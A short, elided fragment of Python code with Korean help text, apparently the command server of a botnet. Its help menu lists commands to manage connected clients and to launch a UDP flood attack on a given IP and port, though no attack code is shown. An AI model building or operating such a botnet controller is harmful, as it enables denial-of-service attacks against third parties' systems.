...
class Server(Colours):
	...
	def take_input(self):
		while True:
			...
			print("올바르지 않은 명령어 입니다. + help를 쳐서 명령어들을 확인해보세요:) +")
	...
	def cmd_help(self):
		help = [
	    "list - 모든 연결된 클라이언트 목록 출력",
        "ping - 모든 클라이언트에게 핑 전송",
        "connect <client_id> - 클라이언트에 연결",
        "attack <ip> <port> <duration> <threads> - 대상에 대한 UDP Flood 공격",
        "tasklist - 모든 실행 중인 작업 목록 출력",
        "kill <task_id> - 특정 작업 종료",
        "killall - 모든 작업 종료",
        "destroy - 모든 클라이언트 파괴",
        "help - 이 도움말 메시지 표시",
